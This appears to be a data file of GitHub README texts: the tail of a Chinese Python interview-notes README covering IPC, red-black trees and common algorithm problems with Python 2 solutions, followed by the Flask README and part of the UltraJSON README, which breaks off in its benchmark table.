\u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff1a\u4e3b\u8981\u4f5c\u4e3a\u8fdb\u7a0b\u95f4\u4ee5\u53ca\u540c\u4e00\u8fdb\u7a0b\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u540c\u6b65\u624b\u6bb5\u3002\n8. \u5957\u63a5\u53e3\uff08Socket\uff09\uff1a\u66f4\u4e3a\u4e00\u822c\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\u673a\u5236\uff0c\u53ef\u7528\u4e8e\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\u3002\u8d77\u521d\u662f\u7531Unix\u7cfb\u7edf\u7684BSD\u5206\u652f\u5f00\u53d1\u51fa\u6765\u7684\uff0c\u4f46\u73b0\u5728\u4e00\u822c\u53ef\u4ee5\u79fb\u690d\u5230\u5176\u5b83\u7c7bUnix\u7cfb\u7edf\u4e0a\uff1aLinux\u548cSystem V\u7684\u53d8\u79cd\u90fd\u652f\u6301\u5957\u63a5\u5b57\u3002\n\n\n# \u6570\u636e\u7ed3\u6784\n\n## 1 \u7ea2\u9ed1\u6811\n\n\u7ea2\u9ed1\u6811\u4e0eAVL\u7684\u6bd4\u8f83\uff1a\n\nAVL\u662f\u4e25\u683c\u5e73\u8861\u6811\uff0c\u56e0\u6b64\u5728\u589e\u52a0\u6216\u8005\u5220\u9664\u8282\u70b9\u7684\u65f6\u5019\uff0c\u6839\u636e\u4e0d\u540c\u60c5\u51b5\uff0c\u65cb\u8f6c\u7684\u6b21\u6570\u6bd4\u7ea2\u9ed1\u6811\u8981\u591a\uff1b\n\n\u7ea2\u9ed1\u662f\u7528\u975e\u4e25\u683c\u7684\u5e73\u8861\u6765\u6362\u53d6\u589e\u5220\u8282\u70b9\u65f6\u5019\u65cb\u8f6c\u6b21\u6570\u7684\u964d\u4f4e\uff1b\n\n\u6240\u4ee5\u7b80\u5355\u8bf4\uff0c\u5982\u679c\u4f60\u7684\u5e94\u7528\u4e2d\uff0c\u641c\u7d22\u7684\u6b21\u6570\u8fdc\u8fdc\u5927\u4e8e\u63d2\u5165\u548c\u5220\u9664\uff0c\u90a3\u4e48\u9009\u62e9AVL\uff0c\u5982\u679c\u641c\u7d22\uff0c\u63d2\u5165\u5220\u9664\u6b21\u6570\u51e0\u4e4e\u5dee\u4e0d\u591a\uff0c\u5e94\u8be5\u9009\u62e9RB\u3002\n\n\u7ea2\u9ed1\u6811\u8be6\u89e3: https:\/\/xieguanglei.github.io\/blog\/post\/red-black-tree.html\n\n\u6559\u4f60\u900f\u5f7b\u4e86\u89e3\u7ea2\u9ed1\u6811: https:\/\/github.com\/julycoding\/The-Art-Of-Programming-By-July\/blob\/master\/ebook\/zh\/03.01.md\n\n# \u7f16\u7a0b\u9898\n\n## 1 \u53f0\u9636\u95ee\u9898\/\u6590\u6ce2\u90a3\u5951\n\n\u4e00\u53ea\u9752\u86d9\u4e00\u6b21\u53ef\u4ee5\u8df3\u4e0a1\u7ea7\u53f0\u9636\uff0c\u4e5f\u53ef\u4ee5\u8df3\u4e0a2\u7ea7\u3002\u6c42\u8be5\u9752\u86d9\u8df3\u4e0a\u4e00\u4e2an\u7ea7\u7684\u53f0\u9636\u603b\u5171\u6709\u591a\u5c11\u79cd\u8df3\u6cd5\u3002\n\n```python\nfib = lambda n: n if n <= 2 else fib(n - 1) + fib(n - 2)\n```\n\n\u7b2c\u4e8c\u79cd\u8bb0\u5fc6\u65b9\u6cd5\n\n```python\ndef memo(func):\n    cache = {}\n    def wrap(*args):\n        if args not in cache:\n            cache[args] = func(*args)\n        return cache[args]\n    return wrap\n\n\n@memo\ndef fib(i):\n    if i < 2:\n        return 1\n    return fib(i-1) + fib(i-2)\n```\n\n\u7b2c\u4e09\u79cd\u65b9\u6cd5\n\n```python\ndef fib(n):\n    a, b = 0, 1\n    for _ in xrange(n):\n        a, b = b, a + b\n    return b\n```\n\n## 2 \u53d8\u6001\u53f0\u9636\u95ee\u9898\n\n\u4e00\u53ea\u9752\u86d9\u4e00\u6b21\u53ef\u4ee5\u8df3\u4e0a1\u7ea7\u53f0\u9636\uff0c\u4e5f\u53ef\u4ee5\u8df3\u4e0a2\u7ea7\u2026\u2026\u5b83\u4e5f\u53ef\u4ee5\u8df3\u4e0an\u7ea7\u3002\u6c42\u8be5\u9752\u86d9\u8df3\u4e0a\u4e00\u4e2an\u7ea7\u7684\u53f0\u9636\u603b\u5171\u6709\u591a\u5c11\u79cd\u8df3\u6cd5\u3002\n\n```python\nfib = lambda n: n if n < 2 else 2 * fib(n - 1)\n```\n\n## 3 \u77e9\u5f62\u8986\u76d6\n\n\u6211\u4eec\u53ef\u4ee5\u7528`2*1`\u7684\u5c0f\u77e9\u5f62\u6a2a\u7740\u6216\u8005\u7ad6\u7740\u53bb\u8986\u76d6\u66f4\u5927\u7684\u77e9\u5f62\u3002\u8bf7\u95ee\u7528n\u4e2a`2*1`\u7684\u5c0f\u77e9\u5f62\u65e0\u91cd\u53e0\u5730\u8986\u76d6\u4e00\u4e2a`2*n`\u7684\u5927\u77e9\u5f62\uff0c\u603b\u5171\u6709\u591a\u5c11\u79cd\u65b9\u6cd5\uff1f\n\n>\u7b2c`2*n`\u4e2a\u77e9\u5f62\u7684\u8986\u76d6\u65b9\u6cd5\u7b49\u4e8e\u7b2c`2*(n-1)`\u52a0\u4e0a\u7b2c`2*(n-2)`\u7684\u65b9\u6cd5\u3002\n\n```python\nf = lambda n: 1 if n < 2 else f(n - 1) + f(n - 2)\n```\n\n## 4 \u6768\u6c0f\u77e9\u9635\u67e5\u627e\n\n\u5728\u4e00\u4e2am\u884cn\u5217\u4e8c\u7ef4\u6570\u7ec4\u4e2d\uff0c\u6bcf\u4e00\u884c\u90fd\u6309\u7167\u4ece\u5de6\u5230\u53f3\u9012\u589e\u7684\u987a\u5e8f\u6392\u5e8f\uff0c\u6bcf\u4e00\u5217\u90fd\u6309\u7167\u4ece\u4e0a\u5230\u4e0b\u9012\u589e\u7684\u987a\u5e8f\u6392\u5e8f\u3002\u8bf7\u5b8c\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u8f93\u5165\u8fd9\u6837\u7684\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\u548c\u4e00\u4e2a\u6574\u6570\uff0c\u5224\u65ad\u6570\u7ec4\u4e2d\u662f\u5426\u542b\u6709\u8be5\u6574\u6570\u3002\n\n\u4f7f\u7528Step-wise\u7ebf\u6027\u641c\u7d22\u3002\n\n```python\ndef get_value(l, r, c):\n    return l[r][c]\n\ndef find(l, x):\n    m = len(l) - 1\n    n = len(l[0]) - 1\n    r = 0\n    c = n\n    while c >= 0 and r <= m:\n        value = get_value(l, r, c)\n        if value == x:\n            return True\n        elif value > x:\n            c = c - 1\n        elif value < x:\n            r = r + 1\n    return False\n```\n\n## 5 \u53bb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20\n\n\u7528\u96c6\u5408\n\n```python\nlist(set(l))\n```\n\n\u7528\u5b57\u5178\n\n```python\nl1 = ['b','c','d','b','c','a','a']\nl2 = {}.fromkeys(l1).keys()\nprint l2\n```\n\n\u7528\u5b57\u5178\u5e76\u4fdd\u6301\u987a\u5e8f\n\n```python\nl1 = ['b','c','d','b','c','a','a']\nl2 = list(set(l1))\nl2.sort(key=l1.index)\nprint l2\n```\n\n\u5217\u8868\u63a8\u5bfc\u5f0f\n\n```python\nl1 = ['b','c','d','b','c','a','a']\nl2 = []\n[l2.append(i) for i in l1 if not i in l2]\n```\n\nsorted\u6392\u5e8f\u5e76\u4e14\u7528\u5217\u8868\u63a8\u5bfc\u5f0f.\n\nl = ['b','c','d','b','c','a','a']\n[single.append(i) for i in sorted(l) if i not in single]\nprint single\n\n## 6 \u94fe\u8868\u6210\u5bf9\u8c03\u6362\n\n`1->2->3->4`\u8f6c\u6362\u6210`2->1->4->3`.\n\n```python\nclass ListNode:\n    def __init__(self, x):\n        self.val = x\n        self.next = None\n\nclass Solution:\n    # @param a ListNode\n    # @return a ListNode\n    def swapPairs(self, head):\n        if head != None and head.next != None:\n            next = head.next\n            head.next = self.swapPairs(next.next)\n            next.next = head\n            return next\n        return head\n```\n\n## 7 \u521b\u5efa\u5b57\u5178\u7684\u65b9\u6cd5\n\n### 1 \u76f4\u63a5\u521b\u5efa\n\n```python\ndict = {'name':'earth', 'port':'80'}\n```\n\n### 2 \u5de5\u5382\u65b9\u6cd5\n\n```python\nitems=[('name','earth'),('port','80')]\ndict2=dict(items)\ndict1=dict((['name','earth'],['port','80']))\n```\n\n### 3 fromkeys()\u65b9\u6cd5\n\n```python\ndict1={}.fromkeys(('x','y'),-1)\ndict={'x':-1,'y':-1}\ndict2={}.fromkeys(('x','y'))\ndict2={'x':None, 'y':None}\n```\n\n## 8 \u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5217\u8868\n\n\u77e5\u4e4e\u8fdc\u7a0b\u9762\u8bd5\u8981\u6c42\u7f16\u7a0b\n\n>  \u5c3e\u9012\u5f52\n\n```python\ndef _recursion_merge_sort2(l1, l2, tmp):\n    if len(l1) == 0 or len(l2) == 0:\n        tmp.extend(l1)\n        tmp.extend(l2)\n        return tmp\n    else:\n        if l1[0] < l2[0]:\n            tmp.append(l1[0])\n            del l1[0]\n        else:\n            tmp.append(l2[0])\n            del l2[0]\n        return _recursion_merge_sort2(l1, l2, tmp)\n\ndef recursion_merge_sort2(l1, l2):\n    return _recursion_merge_sort2(l1, l2, [])\n```\n\n>  \u5faa\u73af\u7b97\u6cd5\n\n\u601d\u8def\uff1a\n\n\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u7a7a\u5217\u8868\n\n\u6bd4\u8f83\u4e24\u4e2a\u5217\u8868\u7684\u9996\u4e2a\u5143\u7d20\n\n\u5c0f\u7684\u5c31\u63d2\u5165\u5230\u65b0\u5217\u8868\u91cc\n\n\u628a\u5df2\u7ecf\u63d2\u5165\u65b0\u5217\u8868\u7684\u5143\u7d20\u4ece\u65e7\u5217\u8868\u5220\u9664\n\n\u76f4\u5230\u4e24\u4e2a\u65e7\u5217\u8868\u6709\u4e00\u4e2a\u4e3a\u7a7a\n\n\u518d\u628a\u65e7\u5217\u8868\u52a0\u5230\u65b0\u5217\u8868\u540e\u9762\n\n\n```pyhton\ndef loop_merge_sort(l1, l2):\n    tmp = []\n    while len(l1) > 0 and len(l2) > 0:\n        if l1[0] < l2[0]:\n            tmp.append(l1[0])\n            del l1[0]\n        else:\n            tmp.append(l2[0])\n            del l2[0]\n    tmp.extend(l1)\n    tmp.extend(l2)\n    return tmp\n```\n\n\n> pop\u5f39\u51fa\n\n```Python\na = [1,2,3,7]\nb = [3,4,5]\n\ndef merge_sortedlist(a,b):\n    c = []\n    while a and b:\n        if a[0] >= b[0]:\n            c.append(b.pop(0))\n        else:\n            c.append(a.pop(0))\n    while a:\n        c.append(a.pop(0))\n    while b:\n        c.append(b.pop(0))\n    return c\nprint merge_sortedlist(a,b)\n    \n```\n\n\n## 9 \u4ea4\u53c9\u94fe\u8868\u6c42\u4ea4\u70b9\n\n> \u5176\u5b9e\u601d\u60f3\u53ef\u4ee5\u6309\u7167\u4ece\u5c3e\u5f00\u59cb\u6bd4\u8f83\u4e24\u4e2a\u94fe\u8868\uff0c\u5982\u679c\u76f8\u4ea4\uff0c\u5219\u4ece\u5c3e\u5f00\u59cb\u5fc5\u7136\u4e00\u81f4\uff0c\u53ea\u8981\u4ece\u5c3e\u5f00\u59cb\u6bd4\u8f83\uff0c\u76f4\u81f3\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\u5373\u4e3a\u4ea4\u53c9\u70b9\uff0c\u5982\u56fe\u6240\u793a\n\n![](http:\/\/hi.csdn.net\/attachment\/201106\/28\/0_1309244136MWLP.gif)\n\n```python\n# \u4f7f\u7528a,b\u4e24\u4e2alist\u6765\u6a21\u62df\u94fe\u8868\uff0c\u53ef\u4ee5\u770b\u51fa\u4ea4\u53c9\u70b9\u662f 7\u8fd9\u4e2a\u8282\u70b9\na = [1,2,3,7,9,1,5]\nb = [4,5,7,9,1,5]\n\nfor i in range(1,min(len(a),len(b))):\n    if i==1 and (a[-1] != b[-1]):\n        print \"No\"\n        break\n    else:\n        if a[-i] != b[-i]:\n            print \"\u4ea4\u53c9\u8282\u70b9\uff1a\",a[-i+1]\n            break\n        else:\n            pass\n```\n\n> \u53e6\u5916\u4e00\u79cd\u6bd4\u8f83\u6b63\u89c4\u7684\u65b9\u6cd5\uff0c\u6784\u9020\u94fe\u8868\u7c7b\n\n```python\nclass ListNode:\n    def __init__(self, x):\n        self.val = x\n        self.next = None\ndef node(l1, l2):\n    length1, lenth2 = 0, 0\n    # \u6c42\u4e24\u4e2a\u94fe\u8868\u957f\u5ea6\n    while l1.next:\n        l1 = l1.next\n        length1 += 1\n    while l2.next:\n        l2 = l2.next\n        length2 += 1\n    # \u957f\u7684\u94fe\u8868\u5148\u8d70\n    if length1 > lenth2:\n        for _ in range(length1 - length2):\n            l1 = l1.next\n    else:\n        for _ in range(length2 - length1):\n            l2 = l2.next\n    while l1 and l2:\n        if l1.next == l2.next:\n            return l1.next\n        else:\n            l1 = l1.next\n            l2 = l2.next\n```\n\n\u4fee\u6539\u4e86\u4e00\u4e0b:\n\n\n```python\n#coding:utf-8\nclass ListNode:\n    def __init__(self, x):\n        self.val = x\n        self.next = None\n\ndef node(l1, l2):\n    length1, length2 = 0, 0\n    # \u6c42\u4e24\u4e2a\u94fe\u8868\u957f\u5ea6\n    while l1.next:\n        l1 = l1.next#\u5c3e\u8282\u70b9\n        length1 += 1\n    while l2.next:\n        l2 = l2.next#\u5c3e\u8282\u70b9\n        length2 += 1\n\n    #\u5982\u679c\u76f8\u4ea4\n    if l1.next == l2.next:\n        # \u957f\u7684\u94fe\u8868\u5148\u8d70\n        if length1 > length2:\n            for _ in range(length1 - length2):\n                l1 = l1.next\n            return l1#\u8fd4\u56de\u4ea4\u70b9\n        else:\n            for _ in range(length2 - length1):\n                l2 = l2.next\n            return l2#\u8fd4\u56de\u4ea4\u70b9\n    # \u5982\u679c\u4e0d\u76f8\u4ea4\n    else:\n        return\n```\n\n\n\u601d\u8def: http:\/\/humaoli.blog.163.com\/blog\/static\/13346651820141125102125995\/\n\n\n## 10 \u4e8c\u5206\u67e5\u627e\n\n\n```python\n\n#coding:utf-8\ndef binary_search(list, item):\n    low = 0\n    high = len(list) - 1\n    while low <= high:\n        mid = (high - low) \/ 2 + low    # \u907f\u514d(high + low) \/ 2\u6ea2\u51fa\n        guess = list[mid]\n        if guess > item:\n            high = mid - 1\n        elif guess < item:\n            low = mid + 1\n        else:\n            return mid\n    return None\nmylist = [1,3,5,7,9]\nprint binary_search(mylist, 3)\n\n```\n\n\u53c2\u8003: http:\/\/blog.csdn.net\/u013205877\/article\/details\/76411718\n\n## 11 \u5feb\u6392\n\n```python\n#coding:utf-8\ndef quicksort(list):\n    if len(list)<2:\n        return list\n    else:\n        midpivot = list[0]\n        lessbeforemidpivot = [i for i in list[1:] if i<=midpivot]\n        biggerafterpivot = [i for i in list[1:] if i > midpivot]\n        finallylist = quicksort(lessbeforemidpivot)+[midpivot]+quicksort(biggerafterpivot)\n        return finallylist\n\nprint quicksort([2,4,6,7,1,2,5])\n```\n\n\n>  \u66f4\u591a\u6392\u5e8f\u95ee\u9898\u53ef\u89c1\uff1a[\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5-\u6392\u5e8f\u7bc7-Python\u63cf\u8ff0](http:\/\/blog.csdn.net\/mrlevo520\/article\/details\/77829204)\n\n\n## 12 \u627e\u96f6\u95ee\u9898\n\n\n```python\n\n#coding:utf-8\n#values\u662f\u786c\u5e01\u7684\u9762\u503cvalues = [ 25, 21, 10, 5, 1]\n#valuesCounts   \u94b1\u5e01\u5bf9\u5e94\u7684\u79cd\u7c7b\u6570\n#money  \u627e\u51fa\u6765\u7684\u603b\u94b1\u6570\n#coinsUsed   \u5bf9\u5e94\u4e8e\u76ee\u524d\u94b1\u5e01\u603b\u6570i\u6240\u4f7f\u7528\u7684\u786c\u5e01\u6570\u76ee\n\ndef coinChange(values,valuesCounts,money,coinsUsed):\n    #\u904d\u5386\u51fa\u4ece1\u5230money\u6240\u6709\u7684\u94b1\u6570\u53ef\u80fd\n    for cents in range(1,money+1):\n        minCoins = cents\n        #\u628a\u6240\u6709\u7684\u786c\u5e01\u9762\u503c\u904d\u5386\u51fa\u6765\u548c\u94b1\u6570\u505a\u5bf9\u6bd4\n        for kind in range(0,valuesCounts):\n            if (values[kind] <= cents):\n                temp = coinsUsed[cents - values[kind]] +1\n                if (temp < minCoins):\n                    minCoins = temp\n        coinsUsed[cents] = minCoins\n        print ('\u9762\u503c:{0}\u7684\u6700\u5c11\u786c\u5e01\u4f7f\u7528\u6570\u4e3a:{1}'.format(cents, coinsUsed[cents]))\n\n```\n\n\u601d\u8def: http:\/\/blog.csdn.net\/wdxin1322\/article\/details\/9501163\n\n\u65b9\u6cd5: http:\/\/www.cnblogs.com\/ChenxofHit\/archive\/2011\/03\/18\/1988431.html\n\n## 13 \u5e7f\u5ea6\u904d\u5386\u548c\u6df1\u5ea6\u904d\u5386\u4e8c\u53c9\u6811\n\n\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6784\u5efa\u4e8c\u53c9\u6811\uff0c\u5e76\u4e14\u6309\u5c42\u6b21\u6253\u5370\u8fd9\u4e2a\u4e8c\u53c9\u6811\n\n\n## 14 \u4e8c\u53c9\u6811\u8282\u70b9\n\n```python\n\nclass Node(object):\n    def __init__(self, data, left=None, right=None):\n        self.data = data\n        self.left = left\n        self.right = right\n\ntree = Node(1, Node(3, Node(7, Node(0)), Node(6)), Node(2, Node(5), Node(4)))\n\n```\n\n## 15 \u5c42\u6b21\u904d\u5386\n\n```python\n\ndef lookup(root):\n    row = [root]\n    while row:\n \u00a0 \u00a0 \u00a0 \u00a0print(row)\n \u00a0 \u00a0 \u00a0 \u00a0row = [kid for item in row for kid in (item.left, item.right) if kid]\n\n```\n\n## 16 \u6df1\u5ea6\u904d\u5386\n\n```python\n\ndef deep(root):\n    if not root:\n        return\n    print root.data\n    deep(root.left)\n    deep(root.right)\n\nif __name__ == '__main__':\n    lookup(tree)\n    deep(tree)\n```\n\n## 17 \u524d\u4e2d\u540e\u5e8f\u904d\u5386\n\n\u6df1\u5ea6\u904d\u5386\u6539\u53d8\u987a\u5e8f\u5c31OK\u4e86\n\n```python\n\n#coding:utf-8\n#\u4e8c\u53c9\u6811\u7684\u904d\u5386\n#\u7b80\u5355\u7684\u4e8c\u53c9\u6811\u8282\u70b9\u7c7b\nclass Node(object):\n    def __init__(self,value,left,right):\n        self.value = value\n        self.left = left\n        self.right = right\n\n#\u4e2d\u5e8f\u904d\u5386:\u904d\u5386\u5de6\u5b50\u6811,\u8bbf\u95ee\u5f53\u524d\u8282\u70b9,\u904d\u5386\u53f3\u5b50\u6811\n\ndef mid_travelsal(root):\n    if root.left is not None:\n        mid_travelsal(root.left)\n    #\u8bbf\u95ee\u5f53\u524d\u8282\u70b9\n    print(root.value)\n    if root.right is not None:\n        mid_travelsal(root.right)\n\n#\u524d\u5e8f\u904d\u5386:\u8bbf\u95ee\u5f53\u524d\u8282\u70b9,\u904d\u5386\u5de6\u5b50\u6811,\u904d\u5386\u53f3\u5b50\u6811\n\ndef pre_travelsal(root):\n    print (root.value)\n    if root.left is not None:\n        pre_travelsal(root.left)\n    if root.right is not None:\n        pre_travelsal(root.right)\n\n#\u540e\u7eed\u904d\u5386:\u904d\u5386\u5de6\u5b50\u6811,\u904d\u5386\u53f3\u5b50\u6811,\u8bbf\u95ee\u5f53\u524d\u8282\u70b9\n\ndef post_trvelsal(root):\n    if root.left is not None:\n        post_trvelsal(root.left)\n    if root.right is not None:\n        post_trvelsal(root.right)\n    print (root.value)\n\n```\n\n## 18 \u6c42\u6700\u5927\u6811\u6df1\n\n```python\ndef maxDepth(root):\n        if not root:\n            return 0\n        return max(maxDepth(root.left), maxDepth(root.right)) + 1\n```\n\n## 19 \u6c42\u4e24\u68f5\u6811\u662f\u5426\u76f8\u540c\n\n```python\ndef isSameTree(p, q):\n    if p == None and q == None:\n        return True\n    elif p and q :\n        return p.val == q.val and isSameTree(p.left,q.left) and isSameTree(p.right,q.right)\n    else :\n        return False\n```\n\n## 20 \u524d\u5e8f\u4e2d\u5e8f\u6c42\u540e\u5e8f\n\n\u63a8\u8350: http:\/\/blog.csdn.net\/hinyunsin\/article\/details\/6315502\n\n```python\ndef rebuild(pre, center):\n    if not pre:\n        return\n    cur = Node(pre[0])\n    index = center.index(pre[0])\n    cur.left = rebuild(pre[1:index + 1], center[:index])\n    cur.right = rebuild(pre[index + 1:], center[index + 1:])\n    return cur\n\ndef deep(root):\n    if not root:\n        return\n    deep(root.left)\n    deep(root.right)\n    print root.data\n```\n\n## 21 \u5355\u94fe\u8868\u9006\u7f6e\n\n```python\nclass Node(object):\n    def __init__(self, data=None, next=None):\n        self.data = data\n        self.next = next\n\nlink = Node(1, Node(2, Node(3, Node(4, Node(5, Node(6, Node(7, Node(8, Node(9)))))))))\n\ndef rev(link):\n    pre = link\n    cur = link.next\n    pre.next = None\n    while cur:\n        tmp = cur.next\n        cur.next = pre\n        pre = cur\n        cur = tmp\n    return pre\n\nroot = rev(link)\nwhile root:\n    print root.data\n    root = root.next\n```\n\n\u601d\u8def: http:\/\/blog.csdn.net\/feliciafay\/article\/details\/6841115\n\n\u65b9\u6cd5: http:\/\/www.xuebuyuan.com\/2066385.html?mobile=1\n\n\n## 22 \u4e24\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u662f\u53d8\u4f4d\u8bcd\n\n```python\nclass Anagram:\n    \"\"\"\n    @:param s1: The first string\n    @:param s2: The second string\n    @:return true or false\n    \"\"\"\n    def Solution1(s1,s2):\n        alist = list(s2)\n\n        pos1 = 0\n        stillOK = True\n\n        while pos1 < len(s1) and stillOK:\n            pos2 = 0\n            found = False\n            while pos2 < len(alist) and not found:\n                if s1[pos1] == alist[pos2]:\n                    found = True\n                else:\n                    pos2 = pos2 + 1\n\n            if found:\n                alist[pos2] = None\n            else:\n                stillOK = False\n\n            pos1 = pos1 + 1\n\n        return stillOK\n\n    print(Solution1('abcd','dcba'))\n\n    def Solution2(s1,s2):\n        alist1 = list(s1)\n        alist2 = list(s2)\n\n        alist1.sort()\n        alist2.sort()\n\n\n        pos = 0\n        matches = True\n\n        while pos < len(s1) and matches:\n            if alist1[pos] == alist2[pos]:\n                pos = pos + 1\n            else:\n                matches = False\n\n        return matches\n\n    print(Solution2('abcde','edcbg'))\n\n    def Solution3(s1,s2):\n        c1 = [0]*26\n        c2 = [0]*26\n\n        for i in range(len(s1)):\n            pos = ord(s1[i])-ord('a')\n            c1[pos] = c1[pos] + 1\n\n        for i in range(len(s2)):\n            pos = ord(s2[i])-ord('a')\n            c2[pos] = c2[pos] + 1\n\n        j = 0\n        stillOK = True\n        while j<26 and stillOK:\n            if c1[j] == c2[j]:\n                j = j + 1\n            else:\n                stillOK = False\n\n        return stillOK\n\n    print(Solution3('apple','pleap'))\n```\n\n\n\n\n## 23 \u52a8\u6001\u89c4\u5212\u95ee\u9898\n\n>  \u53ef\u53c2\u8003\uff1a[\u52a8\u6001\u89c4\u5212(DP)\u7684\u6574\u7406-Python\u63cf\u8ff0](http:\/\/blog.csdn.net\/mrlevo520\/article\/details\/75676160)\n\n\n"},{"repo":"\/pallets\/flask","language":"Python","readme_contents":"Flask\n=====\n\nFlask is a lightweight `WSGI`_ web application framework. It is designed\nto make getting started quick and easy, with the ability to scale up to\ncomplex applications. It began as a simple wrapper around `Werkzeug`_\nand `Jinja`_ and has become one of the most popular Python web\napplication frameworks.\n\nFlask offers suggestions, but doesn't enforce any dependencies or\nproject layout. It is up to the developer to choose the tools and\nlibraries they want to use. There are many extensions provided by the\ncommunity that make adding new functionality easy.\n\n\nInstalling\n----------\n\nInstall and update using `pip`_:\n\n.. code-block:: text\n\n    pip install -U Flask\n\n\nA Simple Example\n----------------\n\n.. code-block:: python\n\n    from flask import Flask\n\n    app = Flask(__name__)\n\n    @app.route(\"\/\")\n    def hello():\n        return \"Hello, World!\"\n\n.. code-block:: text\n\n    $ env FLASK_APP=hello.py flask run\n     * Serving Flask app \"hello\"\n     * Running on http:\/\/127.0.0.1:5000\/ (Press CTRL+C to quit)\n\n\nContributing\n------------\n\nFor guidance on setting up a development environment and how to make a\ncontribution to Flask, see the `contributing guidelines`_.\n\n.. _contributing guidelines: https:\/\/github.com\/pallets\/flask\/blob\/master\/CONTRIBUTING.rst\n\n\nDonate\n------\n\nThe Pallets organization develops and supports Flask and the libraries\nit uses. In order to grow the community of contributors and users, and\nallow the maintainers to devote more time to the projects, `please\ndonate today`_.\n\n.. _please donate today: https:\/\/psfmember.org\/civicrm\/contribute\/transact?reset=1&id=20\n\n\nLinks\n-----\n\n* Website: https:\/\/palletsprojects.com\/p\/flask\/\n* Documentation: https:\/\/flask.palletsprojects.com\/\n* Releases: https:\/\/pypi.org\/project\/Flask\/\n* Code: https:\/\/github.com\/pallets\/flask\n* Issue tracker: https:\/\/github.com\/pallets\/flask\/issues\n* Test status: https:\/\/dev.azure.com\/pallets\/flask\/_build\n* Official chat: https:\/\/discord.gg\/t6rrQZH\n\n.. _WSGI: https:\/\/wsgi.readthedocs.io\n.. _Werkzeug: https:\/\/www.palletsprojects.com\/p\/werkzeug\/\n.. _Jinja: https:\/\/www.palletsprojects.com\/p\/jinja\/\n.. _pip: https:\/\/pip.pypa.io\/en\/stable\/quickstart\/\n"},{"repo":"\/esnme\/ultrajson","language":"C","readme_contents":"UltraJSON\n=============\n.. image:: https:\/\/travis-ci.org\/esnme\/ultrajson.svg?branch=master\n    :target: https:\/\/travis-ci.org\/esnme\/ultrajson\n\nUltraJSON is an ultra fast JSON encoder and decoder written in pure C with bindings for Python 2.5+ and 3.\n\nFor a more painless day to day C\/C++ JSON decoder experience please checkout ujson4c_, based on UltraJSON.\n\n.. _ujson4c: http:\/\/github.com\/esnme\/ujson4c\/\n\n| Please checkout the rest of the projects in the Ultra series:\n| http:\/\/github.com\/esnme\/ultramemcache\n| http:\/\/github.com\/esnme\/ultramysql\n\nTo install it just run Pip as usual:\n\n.. code-block:: sh\n\n    $ pip install ujson\n\n============\nUsage\n============\nMay be used as a drop in replacement for most other JSON parsers for Python:\n\n.. code-block:: python\n\n    >>> import ujson\n    >>> ujson.dumps([{\"key\": \"value\"}, 81, True])\n    '[{\"key\":\"value\"},81,true]'\n    >>> ujson.loads(\"\"\"[{\"key\": \"value\"}, 81, true]\"\"\")\n    [{u'key': u'value'}, 81, True]\n\n~~~~~~~~~~~~~~~\nEncoder options\n~~~~~~~~~~~~~~~\nencode_html_chars\n-----------------\nUsed to enable special encoding of \"unsafe\" HTML characters into safer Unicode sequences. Default is ``False``:\n\n.. code-block:: python\n\n    >>> ujson.dumps(\"<script>John&Doe\", encode_html_chars=True)\n    '\"\\\\u003cscript\\\\u003eJohn\\\\u0026Doe\"'\n\nensure_ascii\n-------------\nLimits output to ASCII and escapes all extended characters above 127. Default is true. If your end format supports UTF-8 setting this option to false is highly recommended to save space:\n\n.. code-block:: python\n\n    >>> ujson.dumps(u\"\\xe5\\xe4\\xf6\")\n    '\"\\\\u00e5\\\\u00e4\\\\u00f6\"'\n    >>> ujson.dumps(u\"\\xe5\\xe4\\xf6\", ensure_ascii=False)\n    '\"\\xc3\\xa5\\xc3\\xa4\\xc3\\xb6\"'\n\nescape_forward_slashes\n----------------------\nControls whether forward slashes (``\/``) are escaped. Default is ``True``:\n\n.. code-block:: python\n\n    >>> ujson.dumps(\"http:\/\/esn.me\")\n    '\"http:\\\/\\\/esn.me\"'\n    >>> ujson.dumps(\"http:\/\/esn.me\", escape_forward_slashes=False)\n    '\"http:\/\/esn.me\"'\n\nindent\n------\nControls whether indention (\"pretty output\") is enabled. Default is ``0`` (disabled):\n\n.. code-block:: python\n\n    >>> ujson.dumps({\"foo\": \"bar\"})\n    '{\"foo\":\"bar\"}'\n    >>> ujson.dumps({\"foo\": \"bar\"}, indent=4)\n    {\n        \"foo\":\"bar\"\n    }\n\n============\t\t\nBenchmarks\t\t\n============\t\t\n*UltraJSON* calls\/sec compared to three other popular JSON parsers with performance gain specified below each.\n\n~~~~~~~~~~~~~\nTest machine:\n~~~~~~~~~~~~~\n\nLinux 3.13.0-66-generic x86_64 #108-Ubuntu SMP Wed Oct 7 15:20:27 UTC 2015\n\n~~~~~~~~~\nVersions:\n~~~~~~~~~\n\n- CPython 2.7.6 (default, Jun 22 2015, 17:58:13) [GCC 4.8.2]\n- blist     : 1.3.6\n- simplejson: 3.8.1\n- ujson     : 1.34 (0c52200eb4e2d97e548a765d5f089858c41967b0)\n- yajl      : 0.3.5\n\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n|                                                                               | ujson      | yajl       | simplejson | json       |\n+===============================================================================+============+============+============+============+\n| Array with 256 doubles                                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |    3508.19 |    5742.00 |    3232.38 |    3309.09 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   25103.37 |   11257.83 |   11696.26 |   11871.04 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 UTF-8 strings                                                  |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |    3189.71 |    2717.14 |    2006.38 |    2961.72 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| 